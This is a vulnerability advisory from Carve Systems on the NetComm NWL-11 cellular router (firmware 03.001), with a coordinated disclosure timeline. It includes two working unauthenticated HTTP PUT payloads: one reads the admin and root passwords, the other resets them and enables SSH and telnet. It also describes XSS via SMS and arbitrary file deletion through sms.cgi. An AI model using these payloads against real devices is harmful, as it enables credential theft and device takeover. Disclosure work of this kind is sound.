# NetComm Wireless Advisory

Please see NetComm firmware (version 2.0.7.4) on the NetComm site and the release notes from the same.

Carve Systems consultants performed, and continue to perform, research on a number of IoT devices. The Carve Systems team coordiantes its disclosure with vendors when at all possible. This advisory is for the NetComm Wireless NWL-11 device. The consultants performed research against the device running the 03.001 version of the firmware. The consultants discovered numerous security findings and disclosed these findings to the vendor.

## Disclosure Timeline

    3/14/16 – Initial contact email sent to vendor.
    3/14/16 – Received email from vendor contact with gpg key for further communication. Vulnerabilities communicated to NetComm.
    3/22/16 – Followup email to NetComm asking if all issues are clear and general status. Contact responds with internal tracking numbers and will follow up with timeline for fix.
    5/18/16 – NetComm sends updated firmware image for testing.
    5/26/16 – Carve re-tests and closes 3 issues on new firmware version.
    6/9/16 – Coordinated public disclosure.

```
Netcomm NWL-11
Firmware version 03.001

Vulnerability Description

1. PUT method allows unauthenticated file uploads to the web root of the device.

This vulnerability allows an unauthenticated attacker to upload arbitrary files
to the device via the HTTP "PUT" verb. In the device’s default configuration,
this is limited to an attacker on the LAN. If an administrator opens the web
 application to the cellular network for remote management, a remote attacker
 can compromise the device without knowledge of device credentials.

An unauthenticated attacker can upload (via HTTP PUT) and then execute (via
HTTP GET) arbitrary server side code to view the user password:

----

PUT /getpw.html HTTP/1.1
Content-Length: 125

<%
pass1 = get_single( 'admin.user.root');
pass2 = get_single( 'admin.user.admin');
%>
<%= pass1 %>
<%= pass2 %>

----

Or to set a new password and enable telnet:

----

PUT /setpw.html HTTP/1.1
Content-Length: 237

<%
set_single( 'admin.user.root=newpass');
set_single( 'admin.user.admin=newpass');
set_single_direct('-p','admin.remote.sshd_enable',1);
set_single( 'telnet.passwd.new=newpass' );
%>

----

2. Multiple Cross-Site Scripting (XSS) Vulnerabilities

A Stored XSS attack is possible via SMS by an unauthenticated attacker.
This attack only requires the MDN of the device be known to the attacker.
Additionally, the application has no observed output encoding or input
validation routines to protect against XSS attacks. In many cases, the
device accepts random parameters in the URL and reflects those inputs
back to the browser without output encoding or any validation, giving an
attacker a very simple path to utilize Reflected XSS as an attack vector.
The application does not protect against CSRF, allowing pre-crafted requests
to be executed via JavaScript.

3. SMS Delete function can delete arbitrary files on the file system

The SMS inbox uses files to store SMS messages on the device. The function
used to delete SMS messages lacks proper input validation. By passing a
fully qualified path name of a file to this function, an attacker could
delete arbitrary files on the file system (e.g. /etc/passwd). The filename
is not validated or sanitized at any point before it is passed to the
DELETE_MSG function in /cgi-bin/sms.cgi
(http://192.168.1.1/cgi-bin/sms.cgi?CMD=DELETE_MSG&INOUT=OUTBOX&)

A low privilege user could delete virtually any file on the system, causing
a system denial of service. In combination with XSS sent via a malicious SMS,
this can be exploited by an unauthenticated attacker to perform a remote
denial of service.

Vulnerability Impact

Included in "vulnerability description" section.
```
